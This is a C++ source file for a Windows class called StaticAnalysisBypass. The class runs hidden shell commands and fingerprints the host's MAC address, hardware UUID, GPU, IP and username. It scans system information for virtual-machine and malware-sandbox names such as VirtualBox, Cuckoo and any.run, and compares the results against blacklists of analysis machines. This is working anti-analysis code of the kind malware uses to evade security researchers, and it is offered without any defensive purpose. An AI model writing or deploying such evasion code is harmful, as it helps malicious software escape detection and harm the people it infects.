#include "StaticAnalysisBypass.h"

std::string StaticAnalysisBypass::executeCommand(std::string command)
{
    HANDLE              hRead, hWrite;
    SECURITY_ATTRIBUTES sa = {sizeof(SECURITY_ATTRIBUTES), NULL, TRUE};

    if (!CreatePipe(&hRead, &hWrite, &sa, 0))
        throw std::runtime_error("Failed to create pipe.");

    STARTUPINFOA        si = {sizeof(STARTUPINFOA)};
    PROCESS_INFORMATION pi;
    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
    si.hStdOutput = hWrite;
    si.hStdError = hWrite;
    si.wShowWindow = SW_HIDE;

    std::string cmd = "cmd /C " + command;
    BOOL        success = CreateProcessA(NULL, &cmd[0], NULL, NULL, TRUE, CREATE_NO_WINDOW, NULL, NULL, &si, &pi);

    if (!success)
    {
        CloseHandle(hWrite);
        CloseHandle(hRead);
        throw std::runtime_error("Failed to execute command.");
    }

    CloseHandle(hWrite);

    char        buffer[128];
    DWORD       bytesRead;
    std::string result;

    while (ReadFile(hRead, buffer, sizeof(buffer) - 1, &bytesRead, NULL) && bytesRead > 0)
    {
        buffer[bytesRead] = 0;
        result += buffer;
    }

    CloseHandle(hRead);
    WaitForSingleObject(pi.hProcess, INFINITE);
    CloseHandle(pi.hProcess);
    CloseHandle(pi.hThread);

    return result;
}

std::string StaticAnalysisBypass::GetMACAddress()
{
    IP_ADAPTER_INFO* pAdapterInfo = nullptr;
    ULONG            ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO*)malloc(sizeof(IP_ADAPTER_INFO));
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO*)malloc(ulOutBufLen);
    }

    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == NO_ERROR)
    {
        std::stringstream macAddress;
        for (UINT i = 0; i < pAdapterInfo->AddressLength; i++)
        {
            macAddress << std::hex << std::setw(2) << std::setfill('0') << (int)pAdapterInfo->Address[i];
            if (i != pAdapterInfo->AddressLength - 1)
                macAddress << ":";
        }
        free(pAdapterInfo);
        return macAddress.str();
    }
    free(pAdapterInfo);
    return "Unknown MAC";
}

std::string StaticAnalysisBypass::GetHWID()
{
    std::string hwid = executeCommand("wmic csproduct get uuid");
    std::regex  regex("\\s+");
    std::string cleaned_hwid = std::regex_replace(hwid, regex, " ");
    return cleaned_hwid.substr(cleaned_hwid.find_first_not_of(" "), cleaned_hwid.find_last_not_of(" ") + 1);
}

std::string StaticAnalysisBypass::GetGPUInfo()
{
    std::string        gpu_info = executeCommand("wmic path win32_videocontroller get caption");
    std::istringstream stream(gpu_info);
    std::string        line;
    std::getline(stream, line);
    return line;
}

std::string StaticAnalysisBypass::GetIPAddress()
{
    char hostname[256];
    gethostname(hostname, sizeof(hostname));

    struct hostent* host_entry = gethostbyname(hostname);
    if (host_entry != nullptr)
    {
        struct in_addr addr;
        memcpy(&addr, host_entry->h_addr_list[0], sizeof(struct in_addr));
        return inet_ntoa(addr);
    }
    return "Unknown IP";
}

std::string StaticAnalysisBypass::GetUsername()
{
    char  username[256];
    DWORD size = sizeof(username);
    if (GetUserNameA(username, &size))
    {
        return std::string(username);
    }
    return "";
}

bool StaticAnalysisBypass::DetectEnvironment()
{
    std::string              system_info = executeCommand("systeminfo");
    std::vector<std::string> vm_indicators = {"VBOX", "VIRTUALBOX", "VMWARE", "XEN", "QEMU", "VIRTUAL", "HYPERVISOR", "SBOX", "SANDBOX", "CWSANDBOX"};
    std::vector<std::string> analysis_indicators = {"virustotal",  "hybrid-analysis", "cuckoo",       "malwr",     "any.run", "reverse.it", "joe sandbox", "threatgrid",
        "cape sandbox", "totalhash",       "intezer", "ahnlab", "AhnLab"};

    for (const auto& indicator : vm_indicators)
    {
        if (system_info.find(indicator) != std::string::npos)
            return true;
    }

    for (const auto& indicator : analysis_indicators)
    {
        if (system_info.find(indicator) != std::string::npos)
            return true;
    }
    
    HRESULT hr = URLDownloadToFile(NULL, "https://www.virustotal.com/", "\\x.txt", 0, NULL);
    return hr != S_OK;
}

bool StaticAnalysisBypass::IsAnalysisVM()
{
    std::string ip_address = GetIPAddress();
    std::string mac_address = GetMACAddress();
    std::string hwid = GetHWID();
    std::string gpu = GetGPUInfo();
    std::string username = GetUsername();

    if (DetectEnvironment() || std::find(blacklisted_ips.begin(), blacklisted_ips.end(), ip_address) != blacklisted_ips.end() ||
        std::find(blacklisted_macs.begin(), blacklisted_macs.end(), mac_address) != blacklisted_macs.end() ||
        std::find(blacklisted_hwids.begin(), blacklisted_hwids.end(), hwid) != blacklisted_hwids.end() ||
        std::find(blacklisted_gpus.begin(), blacklisted_gpus.end(), gpu) != blacklisted_gpus.end() ||
        std::find(blacklistUsers.begin(), blacklistUsers.end(), username) != blacklistUsers.end())
    {
        return true;
    }

    return false;
}